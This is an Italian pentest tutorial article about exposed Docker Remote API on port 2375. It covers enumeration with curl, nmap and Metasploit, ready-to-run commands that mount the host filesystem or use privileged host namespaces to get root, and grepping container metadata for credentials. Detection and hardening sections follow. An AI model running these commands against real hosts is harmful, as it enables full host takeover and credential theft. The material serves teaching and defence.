---
title: 'Porta 2375 Docker API: Enumerazione, RCE e Hardening'
slug: porta-2375-docker-api
description: 'Porta 2375 Docker API pentest: verifica l’accesso senza autenticazione, ottieni RCE e root sull’host e applica detection, TLS, firewall e hardening.'
image: /porta-2375-docker-api-esposta.webp
draft: true
date: 2026-08-16T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - Docker
  - porta 2375
  - Docker Engine API
  - container escape
  - Docker security
---

# Porta 2375 Docker Esposta: dall’API Non Autenticata a Root sull’Host

**La porta 2375/TCP espone la Docker Remote API senza TLS né autenticazione.** Se configurata così, permette a chiunque la raggiunga di creare container arbitrari e ottenere privilegi equivalenti a root sull'host — spesso in pochi secondi, senza username né password. Vediamo perché succede e come si sfrutta.

| Metodo        | Accesso | Rete | Autenticazione               |
| ------------- | ------- | ---- | ---------------------------- |
| `docker.sock` | Locale  | ❌ No | Permessi filesystem locali   |
| **2375/TCP**  | Remoto  | ✅ Sì | ❌ Nessuna                    |
| **2376/TCP**  | Remoto  | ✅ Sì | ✅ TLS con certificati client |

## Cos'è la porta 2375  e perché è così pericolosa

Docker, il programma che gestisce i container su una macchina, si controlla normalmente tramite un file speciale sul disco (`/var/run/docker.sock`). Ma può anche essere controllato **da remoto**, via rete, tramite un'API HTTP. Questa API gira di default su due porte:

* **2375/TCP** — comunicazione in chiaro, HTTP normale, senza nessuna autenticazione
* **2376/TCP** — stessa cosa ma su TLS, con certificati che identificano chi si collega

La 2375 dovrebbe restare chiusa verso l'esterno o al massimo raggiungibile solo da `127.0.0.1` (cioè dalla macchina stessa). Il problema è che spesso un amministratore la apre verso l'esterno per gestire Docker più comodamente da remoto, senza configurare i certificati TLS richiesti dalla 2376. Risultato: chiunque raggiunga quella porta può parlare col demone Docker come se fosse seduto davanti alla macchina.

### Perché questa porta esiste, dopotutto

Non è un capriccio di configurazione senza senso: gestire Docker da remoto serve davvero in diversi scenari — pipeline CI/CD che devono lanciare container di build su un host separato, gestione centralizzata di più nodi Docker Swarm, tool di orchestrazione più vecchi, ambienti di test dove comodità batte sicurezza. Il problema non è che la funzionalità esista, ma che troppo spesso venga attivata senza il livello di protezione (TLS + certificati) che Docker stesso mette a disposizione con la 2376.

***

## Come verificare se la porta 2375 è vulnerabile

Un semplice controllo con `curl` conferma se l'API risponde senza auth:

```bash
curl http://TARGET:2375/version
```

Se la porta è vulnerabile, la risposta è un JSON con versione di Docker, API version, kernel, SO — nessuna richiesta di credenziali.

Altri endpoint utili in fase di ricognizione:

```bash
curl http://TARGET:2375/containers/json      # container in esecuzione
curl http://TARGET:2375/images/json          # immagini disponibili
curl http://TARGET:2375/info                 # dettagli demone/host
```

Da riga di comando, se hai il client Docker installato, puoi puntare direttamente al demone remoto:

```bash
docker -H tcp://TARGET:2375 ps
docker -H tcp://TARGET:2375 images
```

Nessuna autenticazione richiesta: il flag `-H` reindirizza semplicemente il client verso il demone remoto invece che verso `/var/run/docker.sock` locale. In alternativa puoi esportare la variabile d'ambiente ed evitare di ripetere `-H` ad ogni comando:

```bash
export DOCKER_HOST="tcp://TARGET:2375"
docker ps
```

### Nmap e Metasploit

Gli script NSE dedicati a Docker automatizzano parte della ricognizione:

```bash
nmap -sV --script "docker-*" -p 2375 TARGET
```

Metasploit ha un modulo dedicato che verifica l'esposizione e, se auxiliary/exploit, interagisce col demone:

```
msf6 > use exploit/linux/http/docker_daemon_tcp
```

### Ricognizione via Shodan/Censys

In fase di OSINT (fuori scope su ambienti che non possiedi, utile per capire la superficie d'attacco reale su Internet), una query tipo `port:2375` su Shodan o Censys restituisce migliaia di demoni Docker esposti pubblicamente — un promemoria di quanto questa misconfigurazione sia diffusa in produzione, non solo nei lab.

### Gli endpoint principali dell'API, per orientarti

```
GET  /version              # versione demone e API
GET  /info                 # dettagli host e configurazione
GET  /containers/json      # container in esecuzione
GET  /images/json          # immagini disponibili
POST /containers/create    # crea un nuovo container
POST /containers/{id}/start
POST /containers/{id}/exec
```

Tutti questi endpoint, su una 2375 esposta, rispondono senza chiedere nulla.

### Docker rootless elimina il problema?

Docker rootless (il demone gira come utente normale, non come root) riduce l'impatto di un'eventuale compromissione, perché il container non eredita automaticamente privilegi di root sull'host. Ma **non rende sicura un'API esposta senza autenticazione**: chi la raggiunge controlla comunque tutti i container di quell'utente, può leggerne i dati, muoversi verso altri servizi con le stesse credenziali. Rootless attutisce il danno, non sostituisce TLS e firewall.

***

## Exploitation: da API esposta a root sull'host

Il passaggio critico è che tramite l'API puoi creare un container che **monta il filesystem root dell'host** al suo interno. Da lì, un `chroot` ti dà una shell equivalente a root sulla macchina fisica.

```bash
docker -H tcp://TARGET:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Cosa succede in questo comando:

* `-v /:/mnt` monta la root dell'host in `/mnt` dentro il container
* `--rm -it alpine` avvia un container Alpine minimale, interattivo, usa e getta
* `chroot /mnt sh` cambia la root del processo su quella montata: sei nel filesystem dell'host, con permessi di root

Da qui puoi leggere `/etc/shadow`, scrivere una chiave SSH in `/root/.ssh/authorized_keys`, o inserire un cron job — qualsiasi azione da root reale, persistente anche dopo la chiusura del container.

### Variante senza client Docker (solo API HTTP)

Se non hai il binario `docker` disponibile, puoi parlare direttamente con l'API via `curl`, creando il container con una POST a `/containers/create` e avviandolo con `/containers/{id}/start`. È più verboso ma utile quando l'accesso è solo via web/proxy.

### Variante "full escape": privileged + namespace host

Una versione più aggressiva, che ricorre spesso nei writeup, condivide anche i namespace di processi, rete e IPC con l'host:

```bash
docker -H tcp://TARGET:2375 run --rm -it --privileged \
  --pid=host --net=host --ipc=host \
  -v /:/host alpine chroot /host sh
```

`--privileged` disabilita quasi tutte le restrizioni del container, `--pid=host` ti fa vedere i processi dell'host (utile per `nsenter` verso PID 1), `--net=host` ti mette sulla stessa interfaccia di rete della macchina fisica. È l'escape "totale", non solo per filesystem.

### Se non puoi creare container: usa quelli già in esecuzione

Se la policy dell'ambiente limita la creazione di nuovi container ma esponi comunque l'API, puoi comunque:

```bash
docker -H tcp://TARGET:2375 ps -a
docker -H tcp://TARGET:2375 exec -it <CONTAINER_ID> /bin/bash
docker -H tcp://TARGET:2375 inspect <CONTAINER_ID> | grep -i "env\|secret\|password"
```

`inspect` mostra spesso variabili d'ambiente con credenziali (DB, API key) passate al container in chiaro — un classico punto di pivot verso altri servizi.

### CVE-2025-9074: lo stesso bug, in versione "Docker Desktop"

Nel 2025 è stato pubblicato CVE-2025-9074, che riguarda l'esposizione non autenticata della Engine API anche in configurazioni Docker Desktop (opzione "Expose daemon on tcp\://localhost:2375 without TLS"). Il vettore e l'impatto sono identici a quanto visto sopra: creazione di container con bind mount sul filesystem host → compromissione completa. Segno che questa classe di vulnerabilità non è "storia vecchia" ma continua a ripresentarsi.

***

## Perché basta questo per avere root

Il demone Docker gira **come root** sulla macchina, per come è progettato: deve poter creare interfacce di rete, montare filesystem, gestire cgroup, cose che solo root può fare. Chiunque parli con quel demone — che sia via socket locale o via rete — eredita automaticamente quel livello di privilegio. Non è un bug di un singolo container: è così che Docker funziona da sempre, il container non è pensato come barriera di sicurezza contro chi controlla il demone che lo gestisce.

Su HackTheBox e VulnLab questa porta salta fuori in diversi scenari, ed è un ottimo complemento a quanto raccontato nel nostro approfondimento sull'[enumerazione dei servizi Docker](https://hackita.it/articoli/docker-enumeration-tools/):

* come **punto di ingresso iniziale**, quando un servizio containerizzato viene esposto per errore
* come **movimento laterale**, quando un host già compromesso può raggiungere il demone di un'altra macchina della rete interna
* come **escalation locale**: se il tuo utente è nel gruppo `docker` della macchina, è già equivalente a root, con lo stesso principio visto sopra ma senza bisogno della porta di rete

***

## Detection & Blue Team

Dal lato difensivo, i segnali da monitorare:

* **Network**: traffico su 2375/TCP da host non amministrativi, specialmente verso/da subnet diverse da quelle di management
* **Docker events**: comandi `docker create`/`docker run` con mount di `/` o path sensibili dell'host (`-v /:/mnt`, `-v /etc:/etc`) — vanno loggati e alertati via `docker events` o audit del demone
* **Auditd**: regole su `execve` per `chroot` lanciato da processi con parent Docker/containerd
* **Hardening**: la 2375 non dovrebbe mai essere raggiungibile da rete; se serve accesso remoto, solo 2376 con TLS mutuo e certificati client, oppure tunnel SSH verso il socket Unix locale
* **Audit periodico**: [docker-bench-security](https://github.com/docker/docker-bench-security) automatizza il controllo delle configurazioni Docker rispetto alle CIS Benchmark, inclusa l'esposizione dell'API

***

## Remediation

### Checklist di hardening

* Bind del demone solo su `127.0.0.1` o socket Unix (`/var/run/docker.sock`), mai su `0.0.0.0:2375`
* Se serve accesso remoto: TLS obbligatorio con `--tlsverify`, certificati client (porta 2376)
* Firewall: bloccare 2375/2376 da reti non fidate
* Valutare Docker rootless per ridurre l'impatto di un'eventuale compromissione (non sostituisce TLS/firewall)
* Eseguire periodicamente [docker-bench-security](https://github.com/docker/docker-bench-security) per verificare la conformità alle CIS Benchmark
* Aggiornare regolarmente il demone Docker: alcune varianti (come CVE-2025-9074) colpiscono anche configurazioni recenti
* Segmentazione di rete: gli host Docker di gestione non dovrebbero essere raggiungibili dalla stessa subnet degli utenti finali

### Errori comuni che espongono la 2375

* Bind su `0.0.0.0` invece che su `127.0.0.1` per "comodità" durante il debug, mai rimosso dopo
* Docker Desktop con l'opzione "Expose daemon on tcp\://localhost:2375 without TLS" lasciata attiva dopo un test
* Security group cloud (AWS, Azure, GCP) troppo permissivi che lasciano 2375/2376 raggiungibili da Internet
* Nessun firewall applicativo tra la rete di gestione CI/CD e il resto dell'infrastruttura

## Dove si trova più spesso in produzione

Non è solo un tema da lab: la 2375 esposta compare regolarmente su server CI/CD (Jenkins, GitLab Runner con executor Docker), ambienti Kubernetes legacy che si appoggiano ancora a Docker come runtime, VPS configurati velocemente per test, e installazioni Docker Desktop lasciate in modalità debug.

***

## Domande frequenti

**Cos'è la Docker Remote API?**
È l'interfaccia HTTP con cui Docker può essere gestito da remoto — creare, avviare, ispezionare container — invece che solo tramite il socket locale.

**La porta 2375 è sempre vulnerabile se aperta?**
No. È vulnerabile se l'API risponde senza richiedere autenticazione/TLS. Va sempre verificato con una chiamata di test tipo `/version` prima di assumere l'exploitability.

**La 2375 usa HTTPS?**
No, è HTTP in chiaro senza TLS. La versione con TLS è la 2376.

**La 2376 è sicura?**
Sì, se configurata correttamente con certificati client validi — l'autenticazione via TLS mutuo impedisce l'accesso a chi non possiede il certificato.

**Serve il client Docker per sfruttarla?**
No, è sufficiente parlare l'API HTTP via `curl` o qualunque client HTTP; il binario Docker rende solo il flusso più comodo.

**Docker Desktop usa la 2375?**
Solo se l'opzione "Expose daemon on tcp\://localhost:2375 without TLS" viene attivata esplicitamente nelle impostazioni — non è il default.

**Posso disabilitarla?**
Sì: se non ti serve accesso remoto al demone, non aprire nessuna delle due porte e lavora solo tramite `docker.sock` locale.

**Perché basta questo per avere i privilegi di root?**
Perché il demone Docker gira come root sull'host per progettazione, e chi controlla il demone eredita quel livello di privilegio — vedi la sezione dedicata sopra.

**Docker rootless elimina il problema?**
Attutisce l'impatto (non ottieni root sull'host), ma un'API esposta senza autenticazione resta comunque un rischio grave sui container e i dati di quell'utente.

**È lo stesso rischio del socket `/var/run/docker.sock` montato in un container?**
Concettualmente sì: in entrambi i casi chi controlla il demone Docker ottiene privilegi equivalenti a root sull'host. Cambia solo il vettore d'accesso (rete vs socket locale esposto).

***

Una volta dentro, i passi successivi seguono la logica generale che spieghiamo nella nostra [guida alla post-exploitation](https://hackita.it/articoli/post-exploitation/): persistenza, raccolta credenziali, movimento verso altri sistemi. E se il target fa parte di un dominio Active Directory, vale la pena rileggersi anche la nostra guida alla [Windows Privilege Escalation](https://hackita.it/articoli/windows-privilege-escalation/), perché spesso la vera domanda non è "come entro" ma "cosa trovo dentro".

## In sintesi

La porta 2375 esposta non è una vulnerabilità di Docker in senso stretto: è una configurazione errata, per quanto comune. Un'API di gestione senza autenticazione equivale quasi sempre a privilegi di root sull'host, perché è così che il demone Docker è progettato per funzionare. La differenza tra un servizio comodo da amministrare e un accesso root regalato a chiunque sta tutta in due cose: TLS con certificati client, e un firewall che tenga questa porta lontana da reti non fidate.

## Per approfondire

* [HackTricks — 2375, 2376 Pentesting Docker](https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker) — la raccolta più completa di varianti ed edge case su questa tecnica
* [PoC CVE-2025-9074 su GitHub](https://github.com/OilSeller2001/PoC-for-CVE-2025-9074) — proof of concept aggiornato sulla variante che colpisce anche Docker Desktop

***

*Articolo a scopo didattico. Tecniche testate su ambienti autorizzati come HackTheBox, VulnLab e lab personali.*
